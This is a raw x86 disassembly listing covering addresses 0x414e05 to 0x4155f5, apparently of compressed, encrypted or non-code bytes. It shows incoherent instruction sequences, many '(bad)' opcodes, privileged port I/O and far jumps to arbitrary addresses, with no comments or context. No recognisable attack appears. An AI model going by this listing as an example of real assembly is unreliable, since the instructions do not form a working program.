  414e05:	sub    DWORD PTR [ecx+esi*2+0x1e],0x6
  414e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e0b:	retf   0xe520
  414e0e:	mov    bh,ah
  414e10:	das    
  414e11:	sbb    bl,BYTE PTR [ebx-0x4e]
  414e14:	loope  0x414e8e
  414e16:	cmp    al,BYTE PTR [edx]
  414e18:	cmp    cl,BYTE PTR [eax-0x7b33582e]
  414e1e:	inc    ebp
  414e1f:	into   
  414e20:	push   eax
  414e21:	sti    
  414e22:	inc    edi
  414e23:	mov    esi,0x3c5700ba
  414e28:	mov    bh,0x95
  414e2a:	jb     0x414e80
  414e2c:	mov    ds:0x8a0481f0,eax
  414e31:	and    DWORD PTR [edx],ecx
  414e33:	mov    bl,0x9
  414e35:	jns    0x414de2
  414e37:	xchg   DWORD PTR [esi+0x6e],ebp
  414e3a:	dec    ebp
  414e3b:	mov    esi,0x2fd2eaf6
  414e40:	xor    al,BYTE PTR [edi+0x4e]
  414e43:	xor    bh,BYTE PTR [ebp+0x63]
  414e46:	mov    ds:0xafe2801c,eax
  414e4b:	loopne 0x414e8d
  414e4d:	bound  esi,QWORD PTR [edi-0x371d3038]
  414e53:	xchg   edi,eax
  414e54:	clc    
  414e55:	rol    BYTE PTR [edx],0x54
  414e58:	call   0xe9312285
  414e5d:	or     DWORD PTR [edi-0x23],edx
  414e60:	jge    0x414e69
  414e62:	pop    esi
  414e63:	pop    ecx
  414e64:	lea    esi,[edi]
  414e66:	xchg   ebp,eax
  414e67:	mov    dh,0x80
  414e69:	not    BYTE PTR [eax+ebp*4+0x563b1959]
  414e70:	jl     0x414ea7
  414e72:	call   0xf4dc562b
  414e77:	xor    BYTE PTR [edx],ch
  414e79:	lahf   
  414e7a:	int    0xc6
  414e7c:	in     eax,0x3b
  414e7e:	ja     0x414e2f
  414e80:	je     0x414ebd
  414e82:	imul   ecx,eax,0xd8987400
  414e88:	pop    ds
  414e89:	retf   0x423
  414e8c:	or     DWORD PTR [ebx+0x5a],esi
  414e8f:	adc    ecx,DWORD PTR [edi]
  414e91:	fdivr  DWORD PTR [edi]
  414e93:	pop    ebx
  414e94:	adc    bl,BYTE PTR [edi-0x75]
  414e97:	xor    eax,0xbdb37e4c
  414e9c:	outs   dx,BYTE PTR ds:[esi]
  414e9d:	and    eax,0xa8c02308
  414ea2:	inc    ecx
  414ea3:	xor    ebp,DWORD PTR [edi]
  414ea5:	inc    ecx
  414ea6:	mov    edi,0x1098618a
  414eab:	aad    0xab
  414ead:	pop    es
  414eae:	mov    ebp,0x74a7753a
  414eb3:	pop    eax
  414eb4:	lods   eax,DWORD PTR ds:[esi]
  414eb5:	push   eax
  414eb6:	push   0x52
  414eb8:	sbb    al,0xc9
  414eba:	shl    DWORD PTR [ebp-0x6e2d324f],cl
  414ec0:	or     ch,BYTE PTR [ecx+0x5e]
  414ec3:	loopne 0x414ea2
  414ec5:	retf   0xb586
  414ec8:	add    edx,edx
  414eca:	ret    
  414ecb:	inc    ebp
  414ecc:	push   esp
  414ecd:	xchg   edx,eax
  414ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ecf:	outs   dx,BYTE PTR ds:[esi]
  414ed0:	mov    ebx,0x77480ad
  414ed5:	fsubr  QWORD PTR [eax-0x7563b0c7]
  414edb:	popa   
  414edc:	lods   al,BYTE PTR ds:[esi]
  414edd:	mov    ecx,0x3440cc64
  414ee2:	in     eax,0xf8
  414ee4:	imul   ecx,DWORD PTR [eax-0x1a],0xffffffdc
  414ee8:	js     0x414eba
  414eea:	sub    esp,DWORD PTR [edx-0x67]
  414eed:	outs   dx,DWORD PTR ds:[esi]
  414eee:	and    ch,ah
  414ef0:	jb     0x414e80
  414ef2:	push   es
  414ef3:	in     eax,0x18
  414ef5:	repnz or BYTE PTR [esi+0x12d7fc96],ch
  414efc:	stos   DWORD PTR es:[edi],eax
  414efd:	in     al,dx
  414efe:	cmp    BYTE PTR [eax+ecx*1+0x362f2ce3],ah
  414f05:	or     eax,0xc5ccfc64
  414f0a:	int3   
  414f0b:	dec    esi
  414f0c:	dec    esp
  414f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f0e:	ins    BYTE PTR es:[edi],dx
  414f0f:	mov    ebp,0x3431e8c8
  414f14:	fbstp  TBYTE PTR [ebp+0x5806fc6]
  414f1a:	enter  0x2b12,0x3b
  414f1e:	inc    ecx
  414f1f:	jecxz  0x414f8d
  414f21:	dec    ebp
  414f22:	push   ss
  414f23:	popa   
  414f24:	adc    eax,DWORD PTR [ebp-0x6]
  414f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f28:	mov    bl,0x9e
  414f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f2b:	(bad)  [ebx-0x18ff0fc2]
  414f31:	shr    DWORD PTR [edi],1
  414f33:	add    eax,0x86721aee
  414f38:	fld    DWORD PTR ss:[esi-0x68a7bd78]
  414f3f:	in     eax,dx
  414f40:	repnz and al,0x21
  414f43:	add    eax,0xb7cf673c
  414f48:	inc    esp
  414f49:	ins    BYTE PTR es:[edi],dx
  414f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4b:	jno    0x414f8b
  414f4d:	aad    0xf9
  414f4f:	out    dx,eax
  414f50:	and    BYTE PTR [esi],bl
  414f52:	fisttp DWORD PTR [eax+0x2b]
  414f55:	sub    DWORD PTR [eax],ebx
  414f57:	inc    ecx
  414f58:	call   0x12e865f4
  414f5d:	push   edi
  414f5e:	cmp    DWORD PTR [ebp+ebp*2+0x1ebc19d6],0x49
  414f66:	xchg   DWORD PTR ds:0xc199ae80,esp
  414f6c:	mov    dh,0x8c
  414f6e:	adc    al,BYTE PTR [ebp+0x7b24db88]
  414f74:	mov    esi,0x4e737a95
  414f79:	dec    esi
  414f7a:	cmp    ebp,ebx
  414f7c:	mov    eax,0xdb6f2354
  414f81:	push   cs
  414f82:	and    BYTE PTR es:[edi],al
  414f85:	add    al,0xb7
  414f87:	jb     0x414f1b
  414f89:	popf   
  414f8a:	das    
  414f8b:	fist   DWORD PTR ds:0x3fae1f4
  414f91:	daa    
  414f92:	(bad)  
  414f94:	adc    bl,ch
  414f96:	sbb    ebx,DWORD PTR [eax+0x1d65e2a3]
  414f9c:	cmp    ah,BYTE PTR [esi+esi*1]
  414f9f:	mov    ss,ebp
  414fa1:	icebp  
  414fa2:	and    ebp,DWORD PTR [eax]
  414fa4:	mov    ebx,0xae2e2fec
  414fa9:	xor    cl,bl
  414fab:	push   esi
  414fac:	fidiv  DWORD PTR [esi+0x379f58bc]
  414fb2:	inc    ebp
  414fb3:	push   0xffffffc3
  414fb5:	dec    edi
  414fb6:	mov    eax,0x119e66f
  414fbb:	xchg   edi,eax
  414fbc:	dec    edx
  414fbd:	enter  0x555,0xf5
  414fc1:	loopne 0x414f7e
  414fc3:	xchg   edi,eax
  414fc4:	ficomp WORD PTR [ebp+ebx*8+0x5ba2da27]
  414fcb:	inc    edi
  414fcc:	leave  
  414fcd:	pop    ss
  414fce:	xor    ah,cl
  414fd0:	gs hlt 
  414fd2:	add    BYTE PTR [ecx],0x20
  414fd5:	retf   
  414fd6:	dec    ebx
  414fd7:	jbe    0x415052
  414fd9:	rcl    BYTE PTR [eax-0x39be9e16],cl
  414fdf:	pop    es
  414fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fe1:	(bad)  
  414fe2:	aad    0xa6
  414fe4:	out    0xdb,eax
  414fe6:	xlat   BYTE PTR ds:[ebx]
  414fe7:	in     eax,0x8d
  414fe9:	push   ss
  414fea:	adc    DWORD PTR [eax],edi
  414fec:	cwde   
  414fed:	fwait
  414fee:	out    0x2c,eax
  414ff0:	push   esi
  414ff1:	adc    eax,0xffffffcf
  414ff4:	sub    eax,0x7ec4f086
  414ff9:	inc    eax
  414ffa:	jbe    0x415057
  414ffc:	test   BYTE PTR [ebx+0x47],ah
  414fff:	(bad)  
  415000:	pushf  
  415001:	test   al,0x33
  415003:	mov    ebx,edx
  415005:	enter  0xfc92,0x18
  415009:	xor    eax,0xf7043ea0
  41500e:	fidivr DWORD PTR [edx+0xab9aff8]
  415014:	mov    bl,0x2d
  415016:	pop    esp
  415017:	pop    edi
  415018:	mov    al,0x79
  41501a:	ins    BYTE PTR es:[edi],dx
  41501b:	lods   eax,DWORD PTR ds:[esi]
  41501c:	mov    ebp,0x68a14699
  415021:	adc    BYTE PTR [eax+0x2d],dh
  415024:	push   0x462fe9ca
  415029:	jmp    ecx
  41502b:	pop    eax
  41502c:	(bad)  
  41502d:	sub    DWORD PTR [ebx+0x4c],edx
  415030:	ds mov dh,0x54
  415033:	adc    BYTE PTR ds:0x585069f2,0x5b
  41503a:	ja     0x415061
  41503c:	into   
  41503d:	(bad)  
  41503f:	js     0x415089
  415041:	pushf  
  415042:	jno    0x415096
  415044:	sahf   
  415045:	sar    DWORD PTR [edi+0x5881ddd1],0x9e
  41504c:	or     BYTE PTR [edx],0x79
  41504f:	pop    ds
  415050:	mov    edx,0x38f6b27d
  415055:	hlt    
  415056:	imul   edi,DWORD PTR [edx-0x30185b5c],0x6b
  41505d:	arpl   WORD PTR [eax],dx
  41505f:	jmp    0x1a8:0xf4815fbc
  415066:	xor    DWORD PTR [edx-0x41],esp
  415069:	xor    DWORD PTR [edi+0x2a1f4f9a],ecx
  41506f:	test   DWORD PTR ds:0x12f33fe7,esp
  415075:	jl     0x4150f4
  415077:	imul   ebx,edi,0x37
  41507a:	lock inc edi
  41507c:	dec    esp
  41507d:	inc    eax
  41507e:	add    al,0xe9
  415080:	pusha  
  415081:	jge    0x415004
  415083:	cwde   
  415084:	dec    edi
  415085:	pop    ds
  415086:	lea    edi,[esp+esi*1-0x7e]
  41508a:	xor    cl,BYTE PTR [eax+ebx*4-0xa]
  41508e:	ja     0x41505a
  415090:	dec    eax
  415091:	fistp  QWORD PTR [esi-0x543219cc]
  415097:	pushf  
  415098:	mov    edx,0xebd1d114
  41509d:	dec    eax
  41509e:	into   
  41509f:	push   edx
  4150a0:	and    dl,BYTE PTR [ebx-0x68]
  4150a3:	sub    dh,BYTE PTR [esi-0x7b980025]
  4150a9:	or     al,0xf
  4150ab:	loopne 0x415045
  4150ad:	mov    ah,0x2e
  4150af:	xchg   ebp,eax
  4150b0:	data16 or BYTE PTR [ebx],ch
  4150b3:	sbb    DWORD PTR [ecx+edx*4],0xffffffa1
  4150b7:	push   ss
  4150b8:	xor    esi,DWORD PTR [ebp-0x27b7874d]
  4150be:	mov    edx,0x4a31462b
  4150c3:	lea    esp,[ebx-0x4361a0b2]
  4150c9:	adc    DWORD PTR [esi],eax
  4150cb:	test   al,0xa2
  4150cd:	dec    esp
  4150ce:	imul   esi,DWORD PTR [ebx],0xffffffc4
  4150d1:	std    
  4150d2:	stc    
  4150d3:	jecxz  0x41513d
  4150d5:	jmp    0xde50e8b2
  4150da:	enter  0x2b45,0x97
  4150de:	xchg   edi,eax
  4150df:	loope  0x415069
  4150e1:	frstor [esi]
  4150e3:	adc    esi,esi
  4150e5:	add    bh,al
  4150e7:	or     eax,0xe2d28e1a
  4150ec:	jmp    0x8502:0x16d6d1ce
  4150f3:	fstp   st(6)
  4150f5:	pop    edi
  4150f6:	xor    bl,BYTE PTR [edi+0x5a5b409b]
  4150fc:	jecxz  0x41508f
  4150fe:	cmc    
  4150ff:	out    0x31,al
  415101:	pop    es
  415102:	push   0x21
  415104:	sahf   
  415105:	jg     0x4150a9
  415107:	(bad)  
  415108:	out    0x48,al
  41510a:	lods   eax,DWORD PTR ds:[esi]
  41510b:	enter  0x50ef,0x28
  41510f:	xor    eax,0x8d0d26e2
  415114:	test   edx,eax
  415116:	ds add al,0x91
  415119:	in     eax,0xa8
  41511b:	mov    dl,0x6f
  41511d:	lods   eax,DWORD PTR ds:[esi]
  41511e:	push   eax
  41511f:	pextrw ecx,(bad),0xc5
  415121:	mov    WORD PTR ds:0x5d4ccf75,cs
  415127:	xchg   DWORD PTR [ebp-0x4aa7a248],edi
  41512d:	jle    0x4150d8
  41512f:	push   0x7c54007b
  415134:	jo     0x4150c1
  415136:	sbb    al,0x6c
  415139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41513a:	fs dec ecx
  41513c:	adc    DWORD PTR [edi-0x80],0xffffffaf
  415140:	(bad)  
  415141:	jmp    0x415149
  415143:	sub    DWORD PTR [ebx],ecx
  415145:	gs xor al,0xc8
  415148:	or     DWORD PTR [ecx+0x44],0xffffffc0
  41514c:	xchg   esi,eax
  41514d:	jge    0x415176
  41514f:	xchg   ecx,eax
  415150:	fld    st(1)
  415152:	lock pop eax
  415154:	inc    esi
  415155:	das    
  415156:	or     DWORD PTR [ebp-0x265844e],edi
  41515c:	add    esp,ebx
  41515e:	or     BYTE PTR [eax+0x24],dh
  415161:	shl    DWORD PTR [edi+edx*2],cl
  415164:	ret    0x80d0
  415167:	idiv   ebp
  415169:	sbb    BYTE PTR [ecx-0x9c87fd],dh
  41516f:	jno    0x41514c
  415171:	lods   eax,DWORD PTR ds:[esi]
  415172:	lods   al,BYTE PTR ds:[esi]
  415173:	pop    esi
  415174:	test   eax,0x6facbe49
  415179:	jnp    0x415182
  41517b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41517c:	add    edx,DWORD PTR [ebp-0x62]
  41517f:	idiv   ebp
  415181:	cmp    cl,BYTE PTR [ecx+0x46]
  415184:	xor    BYTE PTR [edx+0xc26bec9],dl
  41518a:	aam    0xf7
  41518c:	inc    esi
  41518d:	adc    DWORD PTR cs:[ecx],0xffffffb1
  415191:	or     cl,BYTE PTR [edx+0x2d76296b]
  415197:	jns    0x41512b
  415199:	and    BYTE PTR ds:0x412885fe,al
  41519f:	dec    esi
  4151a0:	mov    esi,ss
  4151a2:	loope  0x415133
  4151a4:	mov    ah,0xad
  4151a6:	out    dx,eax
  4151a7:	loopne 0x415141
  4151a9:	cmp    al,0xc
  4151ab:	es inc ebp
  4151ad:	inc    BYTE PTR [edx-0x59ff9044]
  4151b3:	shr    BYTE PTR [edx],0x74
  4151b6:	push   0xe5fe2d05
  4151bb:	and    esp,ebp
  4151bd:	mov    WORD PTR [esi],es
  4151bf:	frstor [ecx+edi*1]
  4151c2:	cmp    DWORD PTR [ecx-0x7e],ecx
  4151c5:	xlat   BYTE PTR ds:[ebx]
  4151c6:	add    al,0xda
  4151c8:	mov    edx,0x4920e529
  4151cd:	push   es
  4151ce:	mov    esi,0x22da63a5
  4151d3:	sti    
  4151d4:	push   esi
  4151d5:	retf   0x1b04
  4151d8:	mov    esi,0x37fcd765
  4151dd:	jp     0x415199
  4151df:	push   eax
  4151e0:	leave  
  4151e1:	je     0x41519c
  4151e3:	xchg   edi,edx
  4151e5:	fmul   st(1),st
  4151e7:	pop    ss
  4151e8:	test   DWORD PTR [edi],ecx
  4151ea:	fild   DWORD PTR [ebx+0x6]
  4151ed:	mov    ds:0xb27483df,eax
  4151f2:	fst    QWORD PTR [esi+ebx*8+0x4db4570c]
  4151f9:	test   eax,0xb77d900f
  4151fe:	push   ebp
  4151ff:	retf   
  415200:	ror    BYTE PTR [ebp-0x12d3dc6e],0xb1
  415207:	push   ebx
  415208:	iret   
  415209:	lahf   
  41520a:	aas    
  41520b:	pushf  
  41520c:	aas    
  41520d:	hlt    
  41520e:	add    DWORD PTR ds:0xb31868c3,esi
  415214:	mov    dl,BYTE PTR [eax-0x5001ddc8]
  41521a:	addr16 popa 
  41521c:	cdq    
  41521d:	jl     0x415299
  41521f:	cld    
  415220:	mov    eax,0xb6c76719
  415225:	add    BYTE PTR [ebp-0x63731d4a],dh
  41522b:	sahf   
  41522c:	sub    DWORD PTR [eax+0x388551a],ecx
  415232:	jmp    0x41521c
  415234:	(bad)  
  415235:	ffreep st(2)
  415237:	mov    esi,0x9fa3711c
  41523c:	pop    eax
  41523d:	inc    ebp
  41523e:	mov    ds,WORD PTR [edx-0x35dd3468]
  415244:	(bad)  
  415245:	mov    edi,0x22654619
  41524a:	test   edx,edi
  41524c:	xchg   ecx,eax
  41524d:	mov    WORD PTR [esi+0x62f7ec2f],?
  415253:	xor    eax,0x7087c576
  415258:	fidivr DWORD PTR [eax-0x29a7531d]
  41525e:	hlt    
  41525f:	loopne 0x4151ec
  415261:	not    BYTE PTR [edi+0x65]
  415264:	cmp    eax,0x70938968
  415269:	and    DWORD PTR [eax-0x7ab73960],edi
  41526f:	sub    BYTE PTR [ebx],al
  415271:	mov    ecx,0xdc0dafbc
  415276:	push   cs
  415277:	dec    esi
  415278:	fiadd  DWORD PTR [esi+edi*4-0x51b99b1b]
  41527f:	ins    DWORD PTR es:[edi],dx
  415280:	xchg   ecx,eax
  415281:	sub    al,BYTE PTR [edx+0x43d6a4bc]
  415287:	dec    edi
  415288:	adc    BYTE PTR [ebx+esi*4+0x68],ah
  41528c:	xchg   edi,eax
  41528d:	sub    eax,DWORD PTR [ebx+0x54]
  415290:	outs   dx,DWORD PTR ds:[esi]
  415291:	in     eax,0xba
  415293:	rol    dh,cl
  415295:	xor    dh,dh
  415297:	mov    bl,0xad
  415299:	mov    ah,bh
  41529b:	je     0x4152b7
  41529d:	(bad)  
  41529f:	sti    
  4152a0:	or     al,0xea
  4152a2:	inc    esp
  4152a3:	add    BYTE PTR [esi],al
  4152a5:	mov    ds:0x8450c3c,eax
  4152aa:	je     0x4152c4
  4152ac:	imul   ebp,DWORD PTR [edx+0x56cf2e52],0x30
  4152b3:	add    DWORD PTR [ecx],ebx
  4152b5:	adc    DWORD PTR [ecx-0x3aff705c],edi
  4152bb:	icebp  
  4152bc:	cmp    eax,0xdf820340
  4152c1:	adc    bl,BYTE PTR [esi-0x725c3723]
  4152c7:	pop    edx
  4152c8:	jae    0x4152f3
  4152ca:	cmp    cl,BYTE PTR [edx]
  4152cc:	arpl   WORD PTR [ecx+edx*1+0x3acaa088],cx
  4152d3:	cmp    ch,cl
  4152d5:	xor    BYTE PTR [ecx],0x4d
  4152d8:	adc    DWORD PTR [ebp-0x5e],esi
  4152db:	repz clc 
  4152dd:	xor    al,0x1b
  4152df:	test   eax,0xb5119043
  4152e4:	(bad)  
  4152e5:	push   ebx
  4152e6:	pop    ds
  4152e7:	sbb    BYTE PTR [edi-0x4],bh
  4152ea:	xor    al,0x37
  4152ec:	add    BYTE PTR [ebx-0x243a0788],dl
  4152f2:	stos   DWORD PTR es:[edi],eax
  4152f3:	leave  
  4152f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152f5:	sub    al,0x78
  4152f7:	fwait
  4152f8:	lock (bad) 
  4152fa:	pop    ds
  4152fb:	sbb    DWORD PTR [ecx],ecx
  4152fd:	mov    eax,ds:0x28d00c43
  415302:	xchg   edi,eax
  415303:	outs   dx,DWORD PTR ds:[esi]
  415304:	cwde   
  415305:	add    esi,DWORD PTR [esp+eax*4+0x5d1e8c17]
  41530c:	push   es
  41530d:	xor    bh,cl
  41530f:	xchg   ecx,eax
  415310:	xchg   ebx,eax
  415311:	or     BYTE PTR [esp+eax*4],bh
  415314:	cli    
  415315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415316:	pop    ss
  415317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415318:	sti    
  415319:	or     BYTE PTR [ebp-0x6b9163ca],0x5
  415320:	out    0xdc,eax
  415322:	std    
  415323:	mov    esi,0x43c14ab7
  415328:	neg    DWORD PTR [esi]
  41532a:	dec    eax
  41532b:	inc    ebx
  41532c:	loope  0x4152cb
  41532e:	or     bl,al
  415330:	xchg   DWORD PTR [edi],ebx
  415332:	in     eax,dx
  415333:	mov    al,0x28
  415335:	inc    ebp
  415336:	push   ss
  415337:	rcl    BYTE PTR [ecx-0x20],0x33
  41533b:	push   ebp
  41533c:	iret   
  41533d:	sub    al,0x96
  41533f:	inc    eax
  415340:	fcom   DWORD PTR [ebp+edi*4-0x7492b086]
  415347:	xor    al,0xf6
  415349:	and    bh,BYTE PTR [eax+0x53e1f447]
  41534f:	sub    cl,BYTE PTR [ebx+ecx*1]
  415352:	mov    ah,0xe2
  415354:	dec    esi
  415355:	int    0x93
  415357:	push   ebp
  415358:	fcom   QWORD PTR [ebx]
  41535a:	mov    esp,ebx
  41535c:	hlt    
  41535d:	mov    edx,0x17eaa187
  415362:	push   esp
  415363:	in     eax,0xfa
  415365:	fstp   TBYTE PTR [eax]
  415367:	cmp    ebx,DWORD PTR [ebp-0x1b]
  41536a:	cmp    ecx,DWORD PTR [edi-0x6f]
  41536d:	xchg   esp,eax
  41536e:	mov    eax,ds:0xb3aad230
  415373:	fldenv [edx-0x23e1af95]
  415379:	mov    WORD PTR [eax],?
  41537b:	dec    edx
  41537c:	sub    ebp,DWORD PTR [ecx+0x6dbb81aa]
  415382:	outs   dx,DWORD PTR ds:[esi]
  415383:	sub    eax,0x95b541c0
  415388:	std    
  415389:	sar    DWORD PTR [ebp+0x54ccfd68],0x80
  415390:	rol    BYTE PTR [esi+eax*8+0x2d442f14],1
  415397:	mov    esp,0xe402dc2e
  41539c:	in     eax,dx
  41539d:	retf   0x7e5
  4153a0:	and    dh,BYTE PTR [ecx+0x5e9b4f7d]
  4153a6:	iret   
  4153a7:	imul   edi,ebp,0x39
  4153aa:	xchg   ebx,eax
  4153ab:	imul   edx,DWORD PTR [edx-0x3aa36d2b],0x9e5a064b
  4153b5:	out    0xac,al
  4153b7:	pop    eax
  4153b8:	adc    dh,BYTE PTR ds:0x5ad6fa9a
  4153be:	mov    edi,0x1aebc427
  4153c3:	xor    eax,0x7c08bd17
  4153c8:	cmp    al,BYTE PTR fs:[ecx+edx*2+0x65]
  4153cd:	cmp    cl,BYTE PTR [esi-0x21426bfa]
  4153d3:	bound  edx,QWORD PTR [edi+0x10]
  4153d6:	pop    es
  4153d7:	ds mov edx,0xa17cc827
  4153dd:	lock cmc 
  4153df:	mov    eax,ds:0x16e023e
  4153e4:	lea    eax,[edi-0x7ccfc578]
  4153ea:	or     ah,al
  4153ec:	push   esp
  4153ed:	faddp  st(0),st
  4153ef:	mov    ch,BYTE PTR [ecx+eax*2-0xe]
  4153f3:	lahf   
  4153f4:	pushf  
  4153f5:	pop    ss
  4153f6:	(bad)
  4153fa:	call   0xa94288cb
  4153ff:	into   
  415400:	xchg   ebp,eax
  415401:	add    di,dx
  415404:	frndint 
  415406:	sub    eax,0x2f4fea5b
  41540b:	(bad)  
  41540d:	add    eax,0x7e54d295
  415412:	xchg   DWORD PTR [ecx],esp
  415414:	xor    DWORD PTR [ebx+ecx*8],0x7c
  415418:	or     ecx,esi
  41541a:	sub    eax,0x483f2696
  41541f:	xchg   edi,eax
  415420:	retf   
  415421:	jmp    FWORD PTR [esp+ebx*4-0x6750c178]
  415428:	(bad)  
  415429:	jl     0x4153f8
  41542b:	dec    ecx
  41542c:	xchg   ebx,eax
  41542d:	(bad)  
  41542e:	test   DWORD PTR [edi+0x48a154cb],0x46532cac
  415438:	mov    edi,0xff177f84
  41543d:	xchg   BYTE PTR [ebp-0x58a44171],bh
  415443:	xchg   ecx,eax
  415444:	sbb    esi,ecx
  415446:	cmp    eax,0x9c54c288
  41544b:	add    eax,0xbe9fdfc9
  415450:	jmp    0xea7f:0x38064372
  415457:	sub    DWORD PTR [esp+esi*2],edx
  41545a:	push   ecx
  41545b:	pop    ss
  41545c:	cmp    edi,ebp
  41545e:	pop    ebp
  41545f:	cld    
  415460:	cs xor bh,bl
  415463:	outs   dx,BYTE PTR ds:[esi]
  415464:	not    ch
  415466:	adc    BYTE PTR [edx-0x5b6b3359],cl
  41546c:	test   eax,0x61f96926
  415471:	or     dh,cl
  415473:	ss sbb al,0x7
  415476:	mov    al,0x81
  415478:	inc    esp
  415479:	cmp    esi,eax
  41547b:	sub    eax,0xf74d3848
  415480:	scas   eax,DWORD PTR es:[edi]
  415481:	sti    
  415482:	sub    DWORD PTR [edx+0x5bb3ce9],esp
  415488:	mov    WORD PTR [di],ss
  41548b:	and    al,0x50
  41548d:	dec    esp
  41548e:	retf   
  41548f:	xchg   ebp,eax
  415490:	push   0xf1a89012
  415495:	jno    0x4154c6
  415497:	cmp    cl,cl
  415499:	(bad)  
  41549a:	aad    0x8
  41549c:	js     0x4154e2
  41549e:	imul   edx,DWORD PTR [edx+eiz*4+0x5d],0x5d
  4154a3:	mov    esi,0x8c8248c3
  4154a8:	xchg   ebp,eax
  4154a9:	dec    ecx
  4154aa:	pusha  
  4154ab:	int3   
  4154ac:	out    0x52,al
  4154ae:	jnp    0x41546d
  4154b0:	dec    edi
  4154b1:	fnsave [ecx-0x30]
  4154b4:	pop    es
  4154b5:	ins    DWORD PTR es:[edi],dx
  4154b6:	jae    0x4154b4
  4154b8:	pop    esp
  4154ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154bb:	inc    eax
  4154bc:	and    eax,0x72ca9729
  4154c1:	mov    edi,0x3e1e0d9f
  4154c6:	jge    0x41551f
  4154c8:	aaa    
  4154c9:	mov    ds:0x2d86a95b,al
  4154ce:	ins    DWORD PTR es:[edi],dx
  4154cf:	repnz out 0xf5,eax
  4154d2:	lods   al,BYTE PTR ds:[esi]
  4154d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154d4:	mov    cl,0x5
  4154d6:	mov    bh,0xc1
  4154d8:	mov    dh,0xd3
  4154da:	mov    ebx,0x88e6b599
  4154df:	sahf   
  4154e0:	test   cl,0xdf
  4154e3:	ret    0x9e9b
  4154e6:	push   cs
  4154e7:	jbe    0x4154a3
  4154e9:	fstp   DWORD PTR [edi]
  4154eb:	pop    es
  4154ec:	lea    esp,[edx+ecx*2]
  4154ef:	test   eax,0xfb3e8f7d
  4154f4:	daa    
  4154f5:	sbb    DWORD PTR [ecx],0x6e292506
  4154fb:	adc    eax,0x217be17e
  415500:	cmc    
  415501:	pop    esi
  415502:	sub    BYTE PTR [edx-0x40514feb],0x2a
  415509:	mov    ch,0xbd
  41550b:	arpl   di,di
  41550d:	xchg   esi,eax
  41550e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41550f:	push   edi
  415510:	pushf  
  415511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415512:	nop
  415513:	dec    edi
  415514:	adc    BYTE PTR [edx+0x65],cl
  415517:	ror    BYTE PTR [edi+0x38bd5644],1
  41551d:	xchg   edx,eax
  41551e:	push   ecx
  41551f:	rcl    ch,0xa
  415522:	das    
  415523:	jge    0x41550a
  415525:	stc    
  415526:	cmp    ebp,DWORD PTR [edx-0x29dcc7ce]
  41552c:	jmp    0x2eec3c9f
  415531:	shr    DWORD PTR [ebx+0x36],0x46
  415535:	adc    DWORD PTR [edi+0x43a7b01d],ebp
  41553b:	outs   dx,BYTE PTR ds:[esi]
  41553c:	adc    dh,BYTE PTR [eax]
  41553e:	fwait
  41553f:	adc    al,0x80
  415541:	stos   DWORD PTR es:[edi],eax
  415542:	outs   dx,DWORD PTR ds:[esi]
  415543:	xchg   edx,eax
  415544:	sbb    eax,0xca4be3dd
  415549:	inc    eax
  41554a:	fcom   st(6)
  41554c:	or     ah,BYTE PTR [eax+0x6f]
  41554f:	jg     0x4154e2
  415551:	or     BYTE PTR [eax-0x5fba6a5b],dl
  415557:	into   
  415558:	mov    ecx,0xcd96f8b8
  41555d:	fnstcw WORD PTR [esi+0x5ecb6354]
  415563:	sbb    DWORD PTR [esi-0x4dcaf9f2],edx
  415569:	js     0x415518
  41556b:	mov    dh,0xc1
  41556d:	and    eax,0xb270e9b2
  415572:	aam    0x43
  415574:	jb     0x41551b
  415576:	out    dx,eax
  415577:	test   bh,cl
  415579:	fnstenv [ebx+0x3b]
  41557c:	cmp    ebx,edi
  41557e:	mov    dh,0x1a
  415580:	fsincos 
  415582:	aas    
  415583:	mov    ebp,0x241b14aa
  415588:	pop    eax
  415589:	mov    ds:0xcae212c8,al
  41558e:	call   0x156:0x76a6519e
  415595:	aaa    
  415596:	iret   
  415597:	sti    
  415598:	rcl    DWORD PTR [edx],0x51
  41559b:	cmp    ebx,eax
  41559d:	jnp    0x4155b6
  41559f:	xchg   esi,eax
  4155a0:	cmp    al,0x3e
  4155a2:	dec    edx
  4155a3:	xor    al,cl
  4155a5:	pop    esp
  4155a6:	xchg   edi,eax
  4155a7:	jne    0x4155b4
  4155a9:	mov    esp,0x4e99e9de
  4155ae:	adc    eax,0x27519143
  4155b3:	xor    DWORD PTR [ecx],esp
  4155b5:	jns    0x415593
  4155b7:	jecxz  0x415553
  4155b9:	je     0x4155fe
  4155bb:	or     edx,DWORD PTR [ecx+0x2]
  4155be:	aaa    
  4155bf:	out    0xf8,eax
  4155c1:	icebp  
  4155c2:	(bad)  
  4155c3:	dec    eax
  4155c4:	add    edx,DWORD PTR [esi-0x65]
  4155c7:	and    esi,DWORD PTR [ebx-0x7d]
  4155ca:	xor    ebx,DWORD PTR fs:[ebx]
  4155cd:	inc    ebp
  4155ce:	mov    edi,0xd478b65f
  4155d3:	cld    
  4155d4:	pop    ecx
  4155d5:	aam    0xdf
  4155d7:	dec    edi
  4155d8:	push   ebx
  4155d9:	jnp    0x4155ac
  4155db:	xchg   esi,eax
  4155dc:	test   BYTE PTR [edx],0x39
  4155df:	adc    DWORD PTR [ebp-0x5ea88819],0xffffffce
  4155e6:	in     eax,0x84
  4155e8:	dec    ecx
  4155e9:	cdq    
  4155ea:	cmc    
  4155eb:	cli    
  4155ec:	je     0x415608
  4155ee:	outs   dx,BYTE PTR ds:[esi]
  4155ef:	jnp    0x4155fa
  4155f1:	add    ch,ch
  4155f3:	dec    eax
  4155f4:	xchg   ebx,eax
  4155f5:	jmp    0xf709:0x4c673b4e
